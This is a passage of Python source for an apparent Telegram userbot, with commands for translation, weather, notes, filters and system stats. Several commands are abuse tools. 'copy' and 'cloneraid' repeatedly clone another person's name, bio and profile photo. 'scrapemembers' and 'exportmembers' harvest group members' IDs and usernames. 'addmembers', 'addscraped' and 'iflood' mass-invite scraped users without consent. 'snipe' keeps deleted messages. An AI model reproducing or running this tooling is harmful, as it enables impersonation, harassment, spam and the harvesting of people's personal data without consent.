    try:
        resp=requests.get("https://api.mymemory.translated.net/get",
            params={"q":text[:500],"langpair":f"en|{lang.upper()}"},timeout=10).json()
        t=resp.get("responseData",{}).get("translatedText","")
        await edit(e,f"Translated ({lang.upper()}):\n{t}")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("tr")
async def tr_c(e,arg):
    if not arg: return await edit(e,"❌ .tr <text>")
    try:
        url=f"https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=en&dt=t&q={urllib.parse.quote(arg)}"
        resp=requests.get(url,timeout=10).json()
        await edit(e,f"Translation:\n{resp[0][0][0]}")
    except: await edit(e,"❌ Translation failed.")

@cmd("weather")
async def weather_c(e,arg):
    if not arg: return await edit(e,"❌ .weather <city>")
    try:
        geo=requests.get(f"https://geocoding-api.open-meteo.com/v1/search?name={arg}&count=1",timeout=8).json()
        if not geo.get("results"): return await edit(e,"❌ City not found!")
        r=geo["results"][0]
        w=requests.get(f"https://api.open-meteo.com/v1/forecast?latitude={r['latitude']}&longitude={r['longitude']}&current_weather=true",timeout=8).json()
        cw=w.get("current_weather",{})
        await edit(e,f"Weather: {r['name']}, {r.get('country_code','')}\nTemp: `{cw.get('temperature')}C` Wind: `{cw.get('windspeed')} km/h`")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("ip")
async def ip_c(e,arg):
    if not arg: return await edit(e,"❌ .ip <address>")
    try:
        d=requests.get(f"http://ip-api.com/json/{arg}",timeout=8).json()
        if d.get("status")!="success": return await edit(e,"❌ Invalid IP!")
        await edit(e,f"IP: `{d.get('query')}`\nCountry: `{d.get('country')}` City: `{d.get('city')}`\nISP: `{d.get('isp')}`")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("calc")
async def calc_c(e,arg):
    if not arg: return await edit(e,"❌ .calc <expr>")
    try:
        result=eval(arg.strip(),{"__builtins__":None},{"abs":abs,"round":round,"sqrt":math.sqrt,"pi":math.pi,"e":math.e})
        await edit(e,f"`{arg}` = `{result}`")
    except: await edit(e,"❌ Invalid expression.")

@cmd("wiki")
async def wiki_c(e,arg):
    if not arg: return await edit(e,"❌ .wiki <query>")
    try:
        search=requests.get("https://en.wikipedia.org/w/api.php",
            params={"action":"query","list":"search","srsearch":arg,"format":"json","srlimit":1},timeout=8).json()
        results=search.get("query",{}).get("search",[])
        if not results: return await edit(e,"❌ No results.")
        title=results[0]["title"]
        summary=requests.get(f"https://en.wikipedia.org/api/rest_v1/page/summary/{urllib.parse.quote(title)}",timeout=8).json()
        await edit(e,f"{title}\n\n{summary.get('extract','')[:500]}")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("define")
async def define_c(e,arg):
    if not arg: return await edit(e,"❌ .define <word>")
    try:
        data=requests.get(f"https://api.dictionaryapi.dev/api/v2/entries/en/{arg}",timeout=8).json()
        defn=data[0]["meanings"][0]["definitions"][0]["definition"]
        part=data[0]["meanings"][0]["partOfSpeech"]
        await edit(e,f"{arg} ({part})\n{defn}")
    except: await edit(e,f"❌ No definition found.")

@cmd("time")
async def time_c(e,_): await edit(e,f"Time: {datetime.datetime.now().strftime('%A, %B %d %Y - %H:%M:%S')}")

@cmd("speedtest")
async def speedtest_c(e,_):
    await edit(e,"Running speedtest... (.20s)")
    try:
        import speedtest as _st
        def _run():
            s=_st.Speedtest(); s.get_best_server()
            return s.download()/1e6,s.upload()/1e6,s.results.ping
        dl,ul,ping=await asyncio.to_thread(_run)
        await edit(e,f"Download: `{dl:.2f}Mbps` Upload: `{ul:.2f}Mbps` Ping: `{ping:.0f}ms`")
    except ImportError: await edit(e,"❌ pip install speedtest-cli")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("id")
async def id_c(e,arg):
    await e.delete(); chat=await e.get_chat()
    try:
        if e.is_reply:
            r=await e.get_reply_message(); s=await r.get_sender()
            await client.send_message(chat,f"User: {display(s)}\nUsername: @{getattr(s,'username','none')}\nID: `{s.id}`\nChat: `{e.chat_id}`")
        else:
            me=await client.get_me()
            await client.send_message(chat,f"You: {me.first_name}\nUsername: @{me.username or 'none'}\nID: `{me.id}`\nChat: `{e.chat_id}`")
    except Exception as ex: await client.send_message(chat,f"❌ `{ex}`")

@cmd("userinfo")
async def userinfo_c(e,arg):
    await e.delete(); chat=await e.get_chat()
    try:
        ent=None
        if e.is_reply:
            r=await e.get_reply_message(); ent=await r.get_sender()
        elif arg: ent=await client.get_entity(int(arg) if arg.lstrip("-").isdigit() else arg)
        else: ent=await client.get_me()
        if not ent: return
        await client.send_message(chat,
            f"User: {display(ent)}\nUsername: @{getattr(ent,'username','none')}\nID: `{ent.id}`\nBot: {'Yes' if getattr(ent,'bot',False) else 'No'} | Premium: {'Yes' if getattr(ent,'premium',False) else 'No'}")
    except Exception as ex: await client.send_message(chat,f"❌ `{ex}`")

@cmd("pin")
async def pin_c(e,_):
    if not e.is_reply: return await edit(e,"❌ Reply to a message to pin.")
    r=await e.get_reply_message(); await r.pin(); await edit(e,"Pinned!")

@cmd("steal")
async def steal_c(e,arg):
    if not e.is_reply: return await edit(e,"❌ Reply to a sticker.")
    r=await e.get_reply_message()
    if not r.sticker: return await edit(e,"❌ Reply to a sticker.")
    if not GetStickerSetRequest: return await edit(e,"❌ Not available in this Telethon version.")
    await edit(e,"Stealing...")
    try:
        sticker=r.sticker; set_attr=None
        for attr in sticker.attributes:
            if hasattr(attr,"stickerset"): set_attr=attr.stickerset; break
        if not set_attr: return await edit(e,"❌ No sticker set found.")
        orig=await client(GetStickerSetRequest(set_attr,hash=0))
        pack_name=getattr(orig.set,"title","Stolen Pack")
        sticker_files=[]
        for i,doc in enumerate(orig.documents[:120]):
            try:
                path=f"temp/stolen_{e.id}_{i}.webp"
                await client.download_media(doc,file=path); sticker_files.append(path)
            except: pass
        await client.send_message("me",f"Stolen Pack: {pack_name}\n{len(sticker_files)} stickers")
        for path in sticker_files:
            try: await client.send_file("me",path); os.remove(path)
            except: pass
        await edit(e,f"Stolen {len(sticker_files)} stickers from {pack_name}!")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("own")
async def own_c(e,arg):
    if not e.is_reply: return await edit(e,"❌ Reply to a sticker.")
    r=await e.get_reply_message()
    if not r.sticker: return await edit(e,"❌ Reply to a sticker.")
    try:
        path=f"temp/own_{e.id}.webp"
        await client.download_media(r.sticker,file=path)
        await client.send_file("me",path,caption=f"Saved sticker"); os.remove(path)
        await edit(e,"Sticker saved to Saved Messages!")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

_snipe_cache:Dict={}
_edit_snipe_cache:Dict={}

@cmd("snipe")
async def snipe_c(e,_):
    s=_snipe_cache.get(e.chat_id)
    if s: await edit(e,f"Sniped:\nSender: `{s['sender']}`\nText: `{s['text']}`")
    else: await edit(e,"No deleted messages cached.")

@cmd("editsnipe")
async def editsnipe_c(e,_):
    s=_edit_snipe_cache.get(e.chat_id)
    if s: await edit(e,f"Edit Sniped:\nSender: `{s['sender']}`\nAfter: `{s['after']}`")
    else: await edit(e,"No edits cached.")

# ── Profile ───────────────────────────────────────────────────────
async def _snapshot_profile(slot: Dict) -> None:
    """Capture current account profile into `slot` dict (name/last/bio/photo bytes)."""
    me = await client.get_me()
    try:
        full = await client(GetFullUserRequest(me.id))
        bio  = full.full_user.about or ""
    except: bio = ""
    slot["name"]  = me.first_name or ""
    slot["last"]  = me.last_name  or ""
    slot["bio"]   = bio
    photos = await client.get_profile_photos(me.id, limit=1)
    slot["photo"] = await client.download_media(photos[0], file=bytes) if photos else None

async def _apply_profile(slot: Dict, status_msg) -> None:
    """Apply a saved profile slot back to the account."""
    # Delete current photo first
    try:
        my_photos = await client.get_profile_photos("me", limit=1)
        if my_photos:
            p = my_photos[0]
            await client(DeletePhotosRequest(id=[types.InputPhoto(
                id=p.id, access_hash=p.access_hash, file_reference=p.file_reference)]))
    except: pass
    # Upload saved photo
    if slot.get("photo"):
        try:
            buf = BytesIO(slot["photo"]); buf.name = "photo.jpg"
            await client(UploadProfilePhotoRequest(file=await client.upload_file(buf)))
        except: pass
    # Update name/bio
    await client(UpdateProfileRequest(
        first_name = slot.get("name") or "",
        last_name  = slot.get("last") or "",
        about      = slot.get("bio")  or ""
    ))

def _persist_clone_data():
    """Save clone_data to disk so it survives restarts."""
    try:
        import pickle
        _ORIG_PROF_FILE.parent.mkdir(parents=True, exist_ok=True)
        _ORIG_PROF_FILE.write_bytes(pickle.dumps(clone_data))
    except: pass

def _load_clone_data():
    """Load saved clone_data from disk on startup."""
    try:
        import pickle
        if _ORIG_PROF_FILE.exists():
            saved = pickle.loads(_ORIG_PROF_FILE.read_bytes())
            clone_data.update(saved)
    except: pass

@cmd("copy")
async def copy_c(e, arg):
    """Clone another user's profile. Auto-saves YOUR original first if not saved yet."""
    target = None
    if e.is_reply:
        try: r = await e.get_reply_message(); target = await client.get_entity(r.sender_id)
        except: pass
    if not target and arg:
        try: target = await client.get_entity(arg.strip())
        except: pass
    if not target:
        return await edit(e, "❌ Reply to a user or give @username / user_id")

    # ── Auto-save original profile on FIRST copy ever ──────────────
    if not clone_data.get("name"):
        await edit(e, "📸 First time — saving your original profile first...")
        await _snapshot_profile(clone_data)
        _persist_clone_data()

    await edit(e, "🔄 Cloning...")
    try:
        new_name = getattr(target, "first_name", "") or "User"
        new_last = getattr(target, "last_name",  "") or ""
        new_bio  = ""
        try:
            full    = await client(GetFullUserRequest(target.id))
            new_bio = full.full_user.about or ""
        except: pass
        await client(UpdateProfileRequest(first_name=new_name, last_name=new_last, about=new_bio))
        photos = await client.get_profile_photos(target.id, limit=1)
        if photos:
            pb  = await client.download_media(photos[0], file=bytes)
            buf = BytesIO(pb); buf.name = "photo.jpg"
            await client(UploadProfilePhotoRequest(file=await client.upload_file(buf)))
        await edit(e, f"✅ Cloned `{new_name}`!\n💾 Your original is saved — use `{PREFIX}normal` to revert anytime.")
    except Exception as ex:
        await edit(e, f"❌ `{ex}`")

@cmd("save")
async def save_c(e, _):
    """Save YOUR current profile as the restore point (overwrites previous save)."""
    if e.is_reply:
        # legacy: forward a replied message to saved messages
        try: r = await e.get_reply_message(); await r.forward_to("me"); await edit(e, "✅ Forwarded to Saved Messages!"); return
        except: pass
    await edit(e, "📸 Saving your current profile...")
    try:
        await _snapshot_profile(clone_data)
        _persist_clone_data()
        name = clone_data.get("name", "")
        await edit(e, f"✅ Profile saved!\n👤 Name: `{name}`\n🔁 Use `{PREFIX}normal` to restore anytime.")
    except Exception as ex:
        await edit(e, f"❌ `{ex}`")

@cmd("normal")
async def normal_c(e, _):
    """Restore your saved original profile."""
    if not clone_data.get("name"):
        return await edit(e, f"❌ No saved profile found.\nRun `{PREFIX}save` first to snapshot your profile.")
    await edit(e, "🔄 Restoring your original profile...")
    try:
        await _apply_profile(clone_data, e)
        await edit(e, f"✅ Profile restored!\n👤 Back to: `{clone_data.get('name', '')}`")
    except Exception as ex:
        await edit(e, f"❌ `{ex}`")

@cmd("cloneraid")
async def cloneraid_c(e,arg):
    global clone_task
    target=None
    if e.is_reply:
        try: r=await e.get_reply_message(); target=await client.get_entity(r.sender_id)
        except: pass
    if not target and arg:
        try: target=await client.get_entity(arg.strip())
        except: pass
    if not target: return await edit(e,"❌ Reply or give @user")
    if clone_task and not clone_task.done(): clone_task.cancel()
    await edit(e,f"Clone raid ON -> `{display(target)}`")
    async def _loop():
        while True:
            try:
                await client(UpdateProfileRequest(first_name=getattr(target,"first_name",""),last_name=getattr(target,"last_name",""),about=""))
                photos=await client.get_profile_photos(target.id,limit=1)
                if photos:
                    pb=await client.download_media(photos[0],file=bytes); buf=BytesIO(pb); buf.name="photo.jpg"
                    await client(UploadProfilePhotoRequest(file=await client.upload_file(buf)))
            except: pass
            await asyncio.sleep(10)
    clone_task=asyncio.create_task(_loop())

@cmd("chname")
async def chname_c(e,arg):
    if not arg: return await edit(e,"❌ .chname <name>")
    pts=arg.split(maxsplit=1)
    await client(UpdateProfileRequest(first_name=pts[0],last_name=pts[1] if len(pts)>1 else ""))
    await edit(e,f"Name -> `{arg}`")

@cmd("chbio")
async def chbio_c(e,arg):
    if not arg: return await edit(e,"❌ .chbio <bio>")
    await client(UpdateProfileRequest(about=arg)); await edit(e,"Bio updated.")

@cmd("chusername")
async def chusername_c(e,arg):
    if not arg: return await edit(e,"❌ .chusername <username>")
    if not UpdateUsernameRequest: return await edit(e,"❌ Not available.")
    try: await client(UpdateUsernameRequest(arg.lstrip("@"))); await edit(e,f"Username -> `@{arg.lstrip('@')}`")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("afk")
async def afk_c(e,arg):
    me=await client.get_me()
    if arg and arg.lower()=="off": DB.get("afk",{}).pop(str(me.id),None); db_save(); return await edit(e,"AFK OFF")
    DB.setdefault("afk",{})[str(me.id)]=arg or "AFK"; db_save(); await edit(e,f"AFK ON - `{arg or 'AFK'}`")

@cmd("unafk")
async def unafk_c(e,_):
    me=await client.get_me(); DB.get("afk",{}).pop(str(me.id),None); db_save(); await edit(e,"AFK OFF.")

@cmd("online")
async def online_c(e,_):
    DB["always_online"]=not DB.get("always_online",False); db_save()
    await edit(e,f"Always Online: {'ON' if DB['always_online'] else 'OFF'}")

@cmd("ghost")
async def ghost_c(e,_):
    DB["ghost_mode"]=not DB.get("ghost_mode",False); db_save()
    await edit(e,f"Ghost Mode: {'ON' if DB['ghost_mode'] else 'OFF'}")

@cmd("typing")
async def typing_c(e,arg):
    cid_str=arg.strip() if arg.strip() else str(e.chat_id)
    at=DB.setdefault("always_typing",{}); at[cid_str]=not at.get(cid_str,False); db_save()
    await edit(e,f"Always Typing `{cid_str}`: {'ON' if at[cid_str] else 'OFF'}")

@cmd("setwelcome")
async def setwelcome_c(e,arg):
    if not arg: return await edit(e,"❌ .setwelcome <text>\nVars: {mention} {name} {chat} {id} {time} {date}")
    _welcome_cfg["text"]=arg.strip(); _welcome_cfg["enabled"]=True; save_welcome()
    await edit(e,"Welcome updated!")

@cmd("welctest")
async def welctest_c(e,_):
    me=await client.get_me(); chat=await e.get_chat(); now=datetime.datetime.now()
    preview=_welcome_cfg["text"].format(
        mention=f"[{me.first_name}](tg://user?id={me.id})",name=me.first_name or "user",
        chat=getattr(chat,"title","group"),id=me.id,
        time=now.strftime("%I:%M %p"),date=now.strftime("%d %b %Y"))
    await edit(e,f"Welcome Test:\n\n{preview}")

@cmd("welcoff")
async def welcoff_c(e,_): _welcome_cfg["enabled"]=False; save_welcome(); await edit(e,"Welcome disabled.")
@cmd("welcon")
async def welcon_c(e,_): _welcome_cfg["enabled"]=True; save_welcome(); await edit(e,"Welcome enabled.")

@cmd("setgoodbye")
async def setgoodbye_c(e,arg):
    if not arg: return await edit(e,"❌ .setgoodbye <text>\nVars: {mention} {name} {chat}")
    sgc_goodbye[e.chat_id]=arg.strip(); await edit(e,"Goodbye message set!")

@cmd("autorespond")
async def autorespond_c(e,arg):
    if not arg or " " not in arg: return await edit(e,"❌ .autorespond <trigger> <reply>")
    trigger,response=arg.split(" ",1)
    DB.setdefault("autorespond",{}).setdefault(str(e.chat_id),{})[trigger.lower()]=response
    db_save(); await edit(e,f"Auto-respond: `{trigger}` -> `{response[:50]}`")

@cmd("stopautorespond")
async def stopautorespond_c(e,_): DB.get("autorespond",{}).pop(str(e.chat_id),None); db_save(); await edit(e,"Auto-respond disabled.")

@cmd("target")
async def target_c(e,arg):
    if not e.is_reply: return await edit(e,"❌ Reply to a photo with .target <text>")
    r=await e.get_reply_message()
    if not r.photo: return await edit(e,"❌ Reply to a photo!")
    path=f"temp/target_{e.chat_id}.jpg"
    await client.download_media(r.photo,path)
    DB.setdefault("target_store",{})[str(e.chat_id)]={"path":path,"text":arg or ""}
    db_save(); await edit(e,"Target DM auto-reply set!")

@cmd("untarget")
async def untarget_c(e,_):
    data=DB.get("target_store",{}).pop(str(e.chat_id),None)
    if data and os.path.exists(data.get("path","")): 
        try: os.remove(data["path"])
        except: pass
    db_save(); await edit(e,"Target DM removed.")

@cmd("fastgc")
async def fastgc_c(e,arg):
    global fastgc_active,fastgc_task,fastgc_tmpl
    if not arg: return await edit(e,"❌ .fastgc set <template> / .fastgc stop")
    sub=arg.split(" ",1); action=sub[0].lower()
    if action=="stop":
        fastgc_active=False
        if fastgc_task and not fastgc_task.done(): fastgc_task.cancel()
        return await edit(e,"FastGC stopped!")
    if action=="set" and len(sub)>1:
        fastgc_active=True; fastgc_tmpl=sub[1]; cid=e.chat_id
        if fastgc_task and not fastgc_task.done(): fastgc_task.cancel()
        async def _loop():
            while fastgc_active:
                emoji=random.choice(GC_EMOJIS)
                t=(fastgc_tmpl or "").replace("{emoji}",emoji)
                try: await client(EditTitleRequest(cid,t))
                except:
                    try: await client(EditChatTitleRequest(chat_id=cid,title=t))
                    except: pass
                await asyncio.sleep(1)
        fastgc_task=asyncio.ensure_future(_loop())
        return await edit(e,"FastGC started!")
    await edit(e,"❌ Use `set` or `stop`")

@cmd("restart")
async def restart_c(e,_):
    await edit(e,"Restarting...")
    await client.disconnect();     os.execv(sys.executable,[sys.executable]+sys.argv)

# ── Stats ─────────────────────────────────────────────────────────
@cmd("chatstats")
async def chatstats_c(e,_):
    await edit(e,"Analysing...")
    try:
        total=0; mine=0; media=0; text_c=0; me=await client.get_me()
        async for msg in client.iter_messages(e.chat_id,limit=1000):
            total+=1
            if msg.sender_id==me.id: mine+=1
            if msg.media: media+=1
            else: text_c+=1
        await edit(e,f"Chat Stats (last 1000):\nTotal:{total} Mine:{mine}\nText:{text_c} Media:{media}\nMy%:{round(mine/total*100,1) if total else 0}%")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("dbstats")
async def dbstats_c(e,_):
    try:
        total_size=sum(os.path.getsize(f"data/{f}") for f in os.listdir("data") if f.endswith(".json") and os.path.exists(f"data/{f}"))
        await edit(e,f"DB Stats:\nAdmins:{len(bot_admins)} Sudo:{len(sudo_users)}\nMuted:{len(local_muted)} Global:{len(global_muted)}\nTargets:{len(target_gcs)} Bots:{len(bot_usernames)}\nGaalis:{len(GAALI_LIST)} Cmds:{len(COMMANDS)}\nSize:{total_size/1024:.1f}KB")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("sysinfo")
async def sysinfo_c(e,_):
    await edit(e,"Fetching...")
    try:
        import psutil as _ps
        cpu=_ps.cpu_percent(interval=1); ram=_ps.virtual_memory(); disk=_ps.disk_usage("/")
        await edit(e,f"System Info:\nOS:{platform.system()} {platform.release()}\nCPU:{cpu}% Cores:{_ps.cpu_count()}\nRAM:{ram.used/1e9:.1f}GB/{ram.total/1e9:.1f}GB ({ram.percent}%)\nDisk:{disk.used/1e9:.1f}GB/{disk.total/1e9:.1f}GB ({disk.percent}%)\nPython:{platform.python_version()}")
    except ImportError:
        await edit(e,f"System Info (basic):\nOS:{platform.system()} {platform.release()}\nPython:{platform.python_version()}")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("netstats")
async def netstats_c(e,_):
    try:
        import psutil as _ps; net=_ps.net_io_counters()
        await edit(e,f"Network:\nSent:{net.bytes_sent/1e9:.2f}GB Recv:{net.bytes_recv/1e9:.2f}GB\nPkts S:{net.packets_sent:,} R:{net.packets_recv:,}")
    except ImportError: await edit(e,"❌ psutil not available on Android")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("uptime")
async def uptime_c(e,_):
    up=int(time.time()-START_TIME); h,r=divmod(up,3600); m2,s=divmod(r,60)
    await edit(e,f"Bot Uptime: `{h}h {m2}m {s}s`\nStarted: `{datetime.datetime.fromtimestamp(START_TIME).strftime('%d %b %Y %H:%M')}`")

@cmd("storage")
async def storage_c(e,_):
    try:
        total,used,free=shutil.disk_usage("/")
        dl=sum(os.path.getsize(os.path.join("downloads",f)) for f in os.listdir("downloads") if os.path.isfile(os.path.join("downloads",f))) if os.path.exists("downloads") else 0
        await edit(e,f"Storage:\nTotal:{total/1e9:.1f}GB Free:{free/1e9:.1f}GB Used:{used/1e9:.1f}GB\nDownloads:{dl/1e6:.1f}MB")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("cpu")
async def cpu_c(e,_):
    try:
        import psutil as _ps; await edit(e,"Sampling CPU...")
        cpu=_ps.cpu_percent(interval=2); await edit(e,f"CPU:\n{bar(cpu)} `{cpu}%`\nCores:{_ps.cpu_count()}")
    except ImportError: await edit(e,"❌ psutil not available on Android")

@cmd("ram")
async def ram_c(e,_):
    try:
        import psutil as _ps; ram=_ps.virtual_memory()
        await edit(e,f"RAM:\n{bar(ram.percent)} `{ram.percent}%`\n{ram.used/1e9:.1f}GB / {ram.total/1e9:.1f}GB")
    except ImportError: await edit(e,"❌ psutil not available on Android")

@cmd("userbots")
async def userbots_c(e,_):
    me  = await client.get_me()
    up  = int(time.time() - START_TIME)
    h,r = divmod(up, 3600); m2,s = divmod(r, 60)
    await edit(e,
        f"⚡ Active Userbots:\n"
        f"1. {me.first_name} @{me.username or 'none'}\n"
        f"   Uptime: {h}h {m2}m {s}s | Cmds: {len(COMMANDS)}"
    )

# ── Filters & Notes ───────────────────────────────────────────────
@cmd("filter")
async def filter_c(e,arg):
    if not arg or " " not in arg: return await edit(e,"❌ .filter <keyword> <response>")
    key,response=arg.split(" ",1)
    gc_filters.setdefault(e.chat_id,{})[key.lower()]=response; save_filters()
    await edit(e,f"Filter set: `{key}` -> `{response[:50]}`")

@cmd("stopfilter")
async def stopfilter_c(e,arg):
    if not arg: return await edit(e,"❌ .stopfilter <keyword>")
    removed=gc_filters.get(e.chat_id,{}).pop(arg.lower(),None); save_filters()
    await edit(e,f"Filter `{arg}` removed." if removed else f"❌ No filter `{arg}`.")

@cmd("filters")
async def filters_c(e,_):
    f=gc_filters.get(e.chat_id,{})
    if not f: return await edit(e,"No filters set.")
    lines=["Filters:"]
    for k,v in f.items(): lines.append(f"- `{k}` -> `{v[:40]}`")
    await edit(e,"\n".join(lines))

@cmd("clearfilters")
async def clearfilters_c(e,_): gc_filters.pop(e.chat_id,None); save_filters(); await edit(e,"All filters cleared.")

@cmd("note")
async def note_c(e,arg):
    if not arg or " " not in arg: return await edit(e,"❌ .note <key> <text>")
    key,text=arg.split(" ",1)
    notes_store.setdefault(e.chat_id,{})[key.lower()]=text; save_notes()
    await edit(e,f"Note saved: `{key}`")

@cmd("getnote")
async def getnote_c(e,arg):
    if not arg: return await edit(e,"❌ .getnote <key>")
    note=notes_store.get(e.chat_id,{}).get(arg.lower().strip())
    await edit(e,f"{arg}:\n{note}" if note else f"❌ No note `{arg}`.")

@cmd("notes")
async def notes_c(e,_):
    nts=notes_store.get(e.chat_id,{})
    if not nts: return await edit(e,"No notes saved.")
    await edit(e,f"Notes ({len(nts)}):\n"+"\n".join(f"- `{k}`" for k in nts))

@cmd("clearnotes")
async def clearnotes_c(e,_): notes_store.pop(e.chat_id,None); save_notes(); await edit(e,"All notes cleared.")

_reminders_list:list=[]

@cmd("remind")
async def remind_c(e,arg):
    if not arg or " " not in arg: return await edit(e,"❌ .remind <time> <message>\nTime: 30s/5m/2h/1d")
    t_str,msg=arg.split(" ",1); secs=parse_dur(t_str)
    if not secs: return await edit(e,"❌ Invalid time.")
    _reminders_list.append({"chat":e.chat_id,"msg":msg,"at":time.time()+secs})
    await edit(e,f"Reminder set for `{t_str}`: `{msg[:50]}`")
    async def _remind():
        await asyncio.sleep(secs)
        try: await client.send_message(e.chat_id,f"Reminder:\n{msg}")
        except: pass
    asyncio.create_task(_remind())

@cmd("reminders")
async def reminders_c(e,_):
    now=time.time(); active=[r for r in _reminders_list if r.get("at",0)>now]
    if not active: return await edit(e,"No active reminders.")
    lines=["Active Reminders:"]
    for r in active: lines.append(f"- `{r['msg'][:40]}` in `{int(r['at']-now)}s`")
    await edit(e,"\n".join(lines))

@cmd("antilink")
async def antilink_c(e,arg):
    if not arg or arg.lower() not in("on","off"): return await edit(e,"❌ .antilink on/off")
    if arg.lower()=="on": antilink_chats.add(e.chat_id); await edit(e,"Anti-link ON")
    else: antilink_chats.discard(e.chat_id); await edit(e,"Anti-link OFF")

@cmd("antispam")
async def antispam_c(e,arg):
    if not arg or arg.lower() not in("on","off"): return await edit(e,"❌ .antispam on/off")
    if arg.lower()=="on": antispam_chats.add(e.chat_id); await edit(e,"Anti-spam ON")
    else: antispam_chats.discard(e.chat_id); await edit(e,"Anti-spam OFF")

# Mass add
_add_stop2=False
@cmd("addmembers")
async def addmembers_c(e,arg):
    global _add_stop2
    pts=arg.split() if arg else []
    if not pts: return await edit(e,"❌ .addmembers @source [@target]")
    source=pts[0].lstrip("@"); dst=pts[1].lstrip("@") if len(pts)>1 else None; dst_chat=dst or e.chat_id
    await edit(e,f"Scraping @{source} and adding..."); _add_stop2=False
    try:
        src_ent=await client.get_entity(source); members=[]; offset=0
        while True:
            r=await client(GetParticipantsRequest(src_ent,ChannelParticipantsSearch(""),offset,200,0))
            if not r.users: break
            members.extend(r.users)
            if len(r.users)<200: break
            offset+=len(r.users)
        added=0; failed=0
        for u in members:
            if _add_stop2: break
            if u.bot or u.deleted: continue
            try: await client(InviteToChannelRequest(dst_chat,[u])); added+=1; await asyncio.sleep(15)
            except FloodWaitError as fw: await asyncio.sleep(fw.seconds)
            except: failed+=1
        _add_stop2=False
        await client.send_message("me",f"Mass Add Done\nAdded:{added} Failed:{failed} Total:{len(members)}")
    except Exception as ex: _add_stop2=False; await edit(e,f"❌ `{ex}`")

@cmd("stopadd")
async def stopadd_c(e,_): global _add_stop2; _add_stop2=True; await edit(e,"Mass add stopped.")

@cmd("scrapemembers")
async def scrapemembers_c(e,arg):
    group=arg.strip().lstrip("@") if arg else None; target=group or e.chat_id
    await edit(e,f"Scraping `{target}`...")
    try:
        ent=await client.get_entity(target); members=[]; offset=0
        while True:
            r=await client(GetParticipantsRequest(ent,ChannelParticipantsSearch(""),offset,200,0))
            if not r.users: break
            for u in r.users:
                if not u.bot and not u.deleted: members.append({"id":u.id,"username":u.username or "","name":display(u)})
            if len(r.users)<200: break
            offset+=len(r.users)
        DB["scraped_members"]=[m["id"] for m in members]; db_save()
        import json as _j
        fname=f"data/scraped_{e.chat_id}.json"
        with open(fname,"w") as f: _j.dump(members,f,indent=2)
        await edit(e,f"Scraped {len(members)} members -> {fname}")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("addscraped")
async def addscraped_c(e,arg):
    global _add_stop2
    if not arg: return await edit(e,"❌ .addscraped @target")
    scraped=DB.get("scraped_members",[])
    if not scraped: return await edit(e,"❌ No scraped members. Use .scrape first.")
    try: target=await client.get_entity(arg.strip().lstrip("@"))
    except Exception as ex: return await edit(e,f"❌ `{ex}`")
    await edit(e,f"Adding {len(scraped)} members..."); _add_stop2=False; added=0; failed=0
    for uid in scraped:
        if _add_stop2: break
        try: u=await client.get_entity(uid); await client(InviteToChannelRequest(target,[u])); added+=1; await asyncio.sleep(15)
        except FloodWaitError as fw: await asyncio.sleep(fw.seconds)
        except: failed+=1
    _add_stop2=False; await client.send_message("me",f"Added:{added} Failed:{failed}")

@cmd("membercount")
async def membercount_c(e,_):
    try: chat=await e.get_chat(); await edit(e,f"Members: `{getattr(chat,'participants_count','?')}`")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("onlinecount")
async def onlinecount_c(e,_):
    await edit(e,"Counting online members..."); count=0; total=0; now=time.time()
    async for u in client.iter_participants(e.chat_id):
        total+=1
        if hasattr(u,"status") and hasattr(u.status,"expires"):
            if u.status.expires>now: count+=1
    await edit(e,f"Online: `{count}` / `{total}`")

@cmd("botcount")
async def botcount_c(e,_):
    await edit(e,"Counting bots..."); bots=0; total=0
    async for u in client.iter_participants(e.chat_id):
        total+=1
        if u.bot: bots+=1
    await edit(e,f"Bots: `{bots}` / `{total}`")

@cmd("exportmembers")
async def exportmembers_c(e,_):
    await edit(e,"Exporting members...")
    try:
        members=[]
        async for u in client.iter_participants(e.chat_id):
            members.append({"id":u.id,"username":u.username or "","first_name":u.first_name or "","bot":u.bot,"deleted":u.deleted})
        import json as _j
        fname=f"data/export_{e.chat_id}_{int(time.time())}.json"
        with open(fname,"w",encoding="utf-8") as f: _j.dump(members,f,indent=2,ensure_ascii=False)
        await client.send_file("me",fname,caption=f"Exported {len(members)} members")
        await edit(e,f"Exported {len(members)} members"); 
        try: os.remove(fname)
        except: pass
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("iflood")
async def iflood_c(e,arg):
    if not arg: return await edit(e,"❌ .iflood @group")
    scraped=DB.get("scraped_members",[])
    if not scraped: return await edit(e,"❌ No scraped members. Use .scrape first.")
    try: target=await client.get_entity(arg.lstrip("@"))
    except Exception as ex: return await edit(e,f"❌ `{ex}`")
    invited=0
    for uid in scraped[:100]:
        try: u=await client.get_entity(uid); await client(InviteToChannelRequest(target,[u])); invited+=1; await asyncio.sleep(1)
        except: pass
    await client.send_message("me",f"Invited {invited} users to {arg}")

# ── VC commands ───────────────────────────────────────────────────
_VC=False
try:
    from pytgcalls import PyTgCalls
    from pytgcalls.types import AudioPiped, AudioVideoPiped
    _VC=True
except ImportError: pass

_pytg_i=None
async def _get_vc():
    global _pytg_i
    if not _VC: return None
    if _pytg_i is None: _pytg_i=PyTgCalls(client); await _pytg_i.start()
    return _pytg_i

def _vc_msg(): return "py-tgcalls not installed.\nInstall: pip install py-tgcalls"

@cmd("playcall")
async def playcall_c(e,arg):
    if not _VC: return await edit(e,_vc_msg())
    file=arg.strip() if arg.strip() else "51.mp3"
    if not os.path.exists(file): return await edit(e,f"File not found: {file}. Place in bot folder.")
    try:
        pytg=await _get_vc(); await pytg.join_group_call(e.chat_id,AudioPiped(file))
        voice_active[e.chat_id]=True; await edit(e,f"Streaming {file} in VC!")
